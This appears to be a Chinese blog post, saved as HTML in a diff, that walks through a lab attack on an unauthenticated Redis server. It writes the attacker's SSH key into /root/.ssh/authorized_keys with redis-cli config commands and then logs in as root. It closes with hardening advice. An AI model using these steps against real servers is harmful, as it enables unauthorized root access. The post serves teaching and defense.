@@ -1,0 +1,357 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Redis提权攻击 | My Violet Eva Garden</title><meta name="keywords" content="数据库安全"><meta name="author" content="kiyomi"><meta name="copyright" content="kiyomi"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用 ANSI C 语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value 数据库，并提供多种语言的 API。从 2010 年 3 月 15 日起，Redis 的开发工作由 VMware 主持。从 2013 年 5 月开始，Redis 的开发由 Pivotal 赞助。 # 0x00 Redi">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Redis提权攻击">
+<meta property="og:url" content="https://kiyomijin.github.io/2022/09/27/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Redis%E6%8F%90%E6%9D%83%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:site_name" content="My Violet Eva Garden">
+<meta property="og:description" content="Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用 ANSI C 语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value 数据库，并提供多种语言的 API。从 2010 年 3 月 15 日起，Redis 的开发工作由 VMware 主持。从 2013 年 5 月开始，Redis 的开发由 Pivotal 赞助。 # 0x00 Redi">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://kiyomijin.github.io/images/6833939bly1gipexbei4hj20zk0m8npd.jpg">
+<meta property="article:published_time" content="2022-09-26T16:02:13.000Z">
+<meta property="article:modified_time" content="2022-09-26T16:08:16.812Z">
+<meta property="article:author" content="kiyomi">
+<meta property="article:tag" content="数据库安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://kiyomijin.github.io/images/6833939bly1gipexbei4hj20zk0m8npd.jpg"><link rel="shortcut icon" href="https://kiyomijin.github.io/images/favicon.ico"><link rel="canonical" href="https://kiyomijin.github.io/2022/09/27/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Redis%E6%8F%90%E6%9D%83%E6%94%BB%E5%87%BB/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Redis提权攻击',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-09-27 00:08:16'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-clock/lib/clock.min.css" /><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.2.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://kiyomijin.github.io/images/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/%E9%9F%B3%E4%B9%90"><i class="fa-fw /music/"></i><span> 0</span></a></li><li><a class="site-page child" href="/%E7%94%B5%E5%BD%B1"><i class="fa-fw /movies/"></i><span> 1</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://kiyomijin.github.io/images/6833939bly1gipexbei4hj20zk0m8npd.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">My Violet Eva Garden</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/%E9%9F%B3%E4%B9%90"><i class="fa-fw /music/"></i><span> 0</span></a></li><li><a class="site-page child" href="/%E7%94%B5%E5%BD%B1"><i class="fa-fw /movies/"></i><span> 1</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Redis提权攻击</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-09-26T16:02:13.000Z" title="发表于 2022-09-27 00:02:13">2022-09-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-09-26T16:08:16.812Z" title="更新于 2022-09-27 00:08:16">2022-09-27</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/">数据库安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Redis提权攻击"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><strong>Redis</strong>（Remote Dictionary Server )，即远程字典服务，是一个开源的使用 ANSI <a target="_blank" rel="noopener" href="https://baike.baidu.com/item/C%E8%AF%AD%E8%A8%80">C 语言</a>编写、支持网络、可基于内存亦可持久化的日志型、Key-Value<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%BA%93/103728"> 数据库</a>，并提供多种语言的 API。从 2010 年 3 月 15 日起，Redis 的开发工作由 VMware 主持。从 2013 年 5 月开始，Redis 的开发由<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Pivotal"> Pivotal</a> 赞助。</p>
+<h2 id="0x00-redis提权攻击"><a class="markdownIt-Anchor" href="#0x00-redis提权攻击">#</a> 0x00 Redis 提权攻击</h2>
+<p>​	<strong>Redis</strong> 在默认情况下，会绑定在 0.0.0.0:<strong>6379</strong> 上，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务 <code>暴露到公网</code> 上。</p>
+<p>​	如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。</p>
+<p>​	攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的 ssh 公钥写入目标服务器的 /root/.ssh 文件夹的 authotrized_keys 文件中，进而可以使用对应私钥直接使用 ssh 服务登录目标服务器、添加计划任务、写入 Webshell 等操作。</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th><strong>类型</strong></th>
+<th style="text-align:left"><strong>IP</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>目标靶机</strong></td>
+<td>Ubuntu18.04</td>
+<td style="text-align:left">192.168.138.143</td>
+</tr>
+<tr>
+<td><strong>攻击主机</strong></td>
+<td>Kali2022</td>
+<td style="text-align:left">192.168.138.145</td>
+</tr>
+</tbody>
+</table>
+<p>如果没有攻击机没有安装 ssh 则：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#安装</span><br><span class="line">sudo apt install openssh-server</span><br><span class="line">#启动ssh服务</span><br><span class="line">sudo service ssh start</span><br></pre></td></tr></table></figure>
+<h2 id="0x01-被攻击机部分准备工作"><a class="markdownIt-Anchor" href="#0x01-被攻击机部分准备工作">#</a> 0x01 被攻击机部分准备工作</h2>
+<p>在 Ubuntu 安装 redis 服务器</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install redis-server</span><br></pre></td></tr></table></figure>
+<p><img src="image-20220926212305161.png" alt="image-20220926212305161"></p>
+<p>修改 /etc/redis/redis.conf，总共有三点：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/redis/redis.conf</span><br></pre></td></tr></table></figure>
+<p><img src="image-20220926212807655.png" alt="image-20220926212807655"></p>
+<p>①去除 bind</p>
+<p><img src="image-20220926213107025.png" alt="image-20220926213107025"></p>
+<p>②daemonize yes</p>
+<p><img src="image-20220926213521318.png" alt="image-20220926213521318"></p>
+<p>③protected-mode no</p>
+<p><img src="image-20220926232253189.png" alt="image-20220926232253189"></p>
+<p>重启服务</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service redis stop</span><br><span class="line">#以root身份启动redis服务</span><br><span class="line">sudo redis-server /etc/redis/redis.conf</span><br><span class="line">#尝试在服务器上自己连一下</span><br><span class="line">redis-cli</span><br><span class="line">(显示127.0.0.1:6379则OK)</span><br></pre></td></tr></table></figure>
+<p><img src="image-20220926232522408.png" alt="image-20220926232522408"></p>
+<h2 id="0x02-攻击机部分准备工作"><a class="markdownIt-Anchor" href="#0x02-攻击机部分准备工作">#</a> 0x02 攻击机部分准备工作</h2>
+<p>在攻击机上生成 rsa 秘钥</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
+<p><img src="image-20220926214148985.png" alt=""></p>
+<p>重定向到 key.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /home/kali/.ssh</span><br><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt</span><br></pre></td></tr></table></figure>
+<p><img src="image-20220926214549834.png" alt="image-20220926214549834"></p>
+<p>第二句话的含义？其实就是在 id_rsa.pub 的前后加了一个回车</p>
+<p><img src="image-20220926214811675.png" alt="image-20220926214811675"></p>
+<p>之后，我们在攻击机（也就是我的 kali）上安装 redis-cli</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://download.redis.io/redis-stable.tar.gz</span><br><span class="line">tar -zxf redis-stable.tar.gz</span><br><span class="line"></span><br><span class="line"># 进入到 redis-stable 目录</span><br><span class="line">cd redis-stable</span><br><span class="line"># 编译</span><br><span class="line">make</span><br><span class="line"></span><br><span class="line">#拷贝</span><br><span class="line">#编译完成之后，再将 src 目录下的 redis-cli 拷贝到 /usr/bin/ 目录下一份，这样就可直接使用 redis-cli 了</span><br><span class="line">sudo cp ./src/redis-cli /usr/bin/</span><br></pre></td></tr></table></figure>
+<p><img src="image-20220926220032721.png" alt="image-20220926220032721"></p>
+<p>出现如下字样就说明安装成功：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli</span><br><span class="line">回车</span><br></pre></td></tr></table></figure>
+<p><img src="image-20220926220238790.png" alt="image-20220926220238790"></p>
+<p>将我们生成的 key.txt 放到远程主机 (也就是开了 redis 服务的服务器) 的 redis-cli 内存上，查看远程服务器的 ip 为：192.168.138.143</p>
+<p><img src="image-20220926220116946.png" alt="image-20220926220116946"></p>
+<h2 id="0x03-开始攻击"><a class="markdownIt-Anchor" href="#0x03-开始攻击">#</a> 0x03 开始攻击</h2>
+<p>拿到 redis 的 shell 后基本操作：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">info  #查看redis的信息和服务器信息</span><br><span class="line">flushall 删除全部数据</span><br><span class="line">del key  删除键为key的数据</span><br><span class="line">get key  得到参数key的数据</span><br></pre></td></tr></table></figure>
+<p><img src="image-20220926234426901.png" alt="image-20220926234426901"></p>
+<p>在我们的攻击机 (kali) 上运行如下代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /home/kali/.ssh/key.txt | redis-cli -h 192.168.138.143 -x set test</span><br><span class="line">看到回显了OK以后</span><br><span class="line">redis-cli -h 192.168.138.143进入shell</span><br></pre></td></tr></table></figure>
+<p><img src="image-20220926222112479.png" alt="image-20220926222112479"></p>
+<p>将目录切换到 /root/.ssh</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">config set dir /root/.ssh</span><br></pre></td></tr></table></figure>
+<p><img src="image-20220926231146929.png" alt="image-20220926231146929"></p>
+<p>设置数据库名，覆盖我们的文件（保存数据库的内容到 /root/.ssh/authorized_keys ）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">config set dbfilename authorized_keys</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+<p><img src="image-20220926232746706.png" alt=""></p>
+<p>最后，回到生成秘钥的终端：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#使用ssh命令 以root用户的身份 连接“被攻击机”的ip</span><br><span class="line">ssh root@192.168.138.143</span><br></pre></td></tr></table></figure>
+<p><img src="image-20220926232832651.png" alt="image-20220926232832651"></p>
+<p>至此，redis 提权攻击完成。</p>
+<h2 id="0x04-修复建议安全加固"><a class="markdownIt-Anchor" href="#0x04-修复建议安全加固">#</a> 0x04 修复建议 / 安全加固</h2>
+<p><strong>1. 禁止一些高危命令</strong> (重启 redis 才能生效)</p>
+<p>修改 redis.conf 文件，添加</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rename-command FLUSHALL &quot;&quot;</span><br><span class="line">rename-command CONFIG &quot;&quot;</span><br><span class="line">rename-command EVAL &quot;&quot;</span><br></pre></td></tr></table></figure>
+<p>或者另起名字</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rename-command FLUSHALL &quot;name1&quot;</span><br><span class="line">rename-command CONFIG &quot;name2&quot;</span><br><span class="line">rename-command EVAL &quot;name3&quot;</span><br></pre></td></tr></table></figure>
+<p>来禁用远程修改 DB 文件地址</p>
+<p><strong>2. 以低权限运行 Redis 服务</strong></p>
+<p>为 Redis 服务创建单独的用户和家目录，并且配置禁止登陆</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">groupadd -r redis &amp;&amp; useradd -r -g redis redis</span><br></pre></td></tr></table></figure>
+<p><strong>3. 为 Redis 添加密码验证</strong></p>
+<p>修改 redis.conf 文件，添加</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">requirepass mypassword</span><br></pre></td></tr></table></figure>
+<p><strong>4. 禁止外网访问 Redis</strong></p>
+<p>修改 redis.conf 文件，添加或修改，使得 Redis 服务只在当前主机可用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bind 127.0.0.1 :1</span><br></pre></td></tr></table></figure>
+<p>redis 3.2 之后，redis 增加了 protected-mode ，在这个模式下，非绑定 IP 或者没有配置密码时都会报错。</p>
+<p><strong>5. 保证 authorized_keys 文件的安全</strong></p>
+<p>为了保证安全，您应该阻止其他用户添加新的公钥。</p>
+<p>将 authorized_keys 的权限设置为对拥有者只读，其他用户没有任何权限：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 400 ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
+<p>为保证 authorized_keys 的权限不会被改掉，您还需要设置该文件的 immutable 位权限：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chattr +i ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
+<p>然而，用户还可以重命名～/.ssh，然后新建新的～/.ssh 目录和 authorized_keys 文件。要避免这种情况，需要设置～./ssh 的 immutable 位权限：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chattr +i ~/.ssh</span><br></pre></td></tr></table></figure>
+<p><strong>注意:</strong> 如果需要添加新的公钥，需要移除 authorized_keys 的 immutable 位权限。然后，添加好新的公钥之后，按照上述步骤重新加上 immutable 位权限。</p>
+<p><strong>6. 修改默认端口</strong></p>
+<p>修改 redis.conf 文件， 找到并修改原来的 <code>port 6379</code>  ，比如改成 <code>port 17033</code> ，让人摸不着头脑。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">port 17033 </span><br></pre></td></tr></table></figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://kiyomijin.github.io">kiyomi</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://kiyomijin.github.io/2022/09/27/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Redis%E6%8F%90%E6%9D%83%E6%94%BB%E5%87%BB/">https://kiyomijin.github.io/2022/09/27/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Redis%E6%8F%90%E6%9D%83%E6%94%BB%E5%87%BB/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://kiyomijin.github.io" target="_blank">My Violet Eva Garden</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/">数据库安全</a></div><div class="post_share"><div class="social-share" data-image="https://kiyomijin.github.io/images/6833939bly1gipexbei4hj20zk0m8npd.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/09/17/CTF%E5%B0%8F%E8%AE%AD/Misc/Misc%E2%80%94%E2%80%94%E7%A7%81%E6%9C%89bit%E9%9A%90%E5%86%99/"><img class="next-cover" src="https://kiyomijin.github.io/images/6833939bly1gipevarprfj20zk0m8npd.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Misc——私有bit隐写</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://kiyomijin.github.io/images/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">kiyomi</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/kiyomijin"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到柚子の小窝</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-redis%E6%8F%90%E6%9D%83%E6%94%BB%E5%87%BB"><span class="toc-number">1.</span> <span class="toc-text"> 0x00 Redis 提权攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E8%A2%AB%E6%94%BB%E5%87%BB%E6%9C%BA%E9%83%A8%E5%88%86%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="toc-number">2.</span> <span class="toc-text"> 0x01 被攻击机部分准备工作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E6%94%BB%E5%87%BB%E6%9C%BA%E9%83%A8%E5%88%86%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="toc-number">3.</span> <span class="toc-text"> 0x02 攻击机部分准备工作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E5%BC%80%E5%A7%8B%E6%94%BB%E5%87%BB"><span class="toc-number">4.</span> <span class="toc-text"> 0x03 开始攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA"><span class="toc-number">5.</span> <span class="toc-text"> 0x04 修复建议 &#x2F; 安全加固</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/09/27/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Redis%E6%8F%90%E6%9D%83%E6%94%BB%E5%87%BB/" title="Redis提权攻击"><img src="https://kiyomijin.github.io/images/6833939bly1gipexbei4hj20zk0m8npd.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Redis提权攻击"/></a><div class="content"><a class="title" href="/2022/09/27/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Redis%E6%8F%90%E6%9D%83%E6%94%BB%E5%87%BB/" title="Redis提权攻击">Redis提权攻击</a><time datetime="2022-09-26T16:02:13.000Z" title="发表于 2022-09-27 00:02:13">2022-09-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/09/17/CTF%E5%B0%8F%E8%AE%AD/Misc/Misc%E2%80%94%E2%80%94%E7%A7%81%E6%9C%89bit%E9%9A%90%E5%86%99/" title="Misc——私有bit隐写"><img src="https://kiyomijin.github.io/images/6833939bly1gipevarprfj20zk0m8npd.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Misc——私有bit隐写"/></a><div class="content"><a class="title" href="/2022/09/17/CTF%E5%B0%8F%E8%AE%AD/Misc/Misc%E2%80%94%E2%80%94%E7%A7%81%E6%9C%89bit%E9%9A%90%E5%86%99/" title="Misc——私有bit隐写">Misc——私有bit隐写</a><time datetime="2022-09-17T06:02:32.000Z" title="发表于 2022-09-17 14:02:32">2022-09-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/07/14/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/" title="测试文章"><img src="https://kiyomijin.github.io/images/6833939bly1giclimtf7dj20zk0m8qav.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="测试文章"/></a><div class="content"><a class="title" href="/2022/07/14/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/" title="测试文章">测试文章</a><time datetime="2022-07-13T19:13:28.000Z" title="发表于 2022-07-14 03:13:28">2022-07-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/07/13/hello-world/" title="Hello World"><img src="https://kiyomijin.github.io/images/6833939bly1gicitzannuj20zk0m8b29.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hello World"/></a><div class="content"><a class="title" href="/2022/07/13/hello-world/" title="Hello World">Hello World</a><time datetime="2022-07-13T15:20:21.111Z" title="发表于 2022-07-13 23:20:21">2022-07-13</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://kiyomijin.github.io/images/6833939bly1gipexbei4hj20zk0m8npd.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By kiyomi</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">简</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script 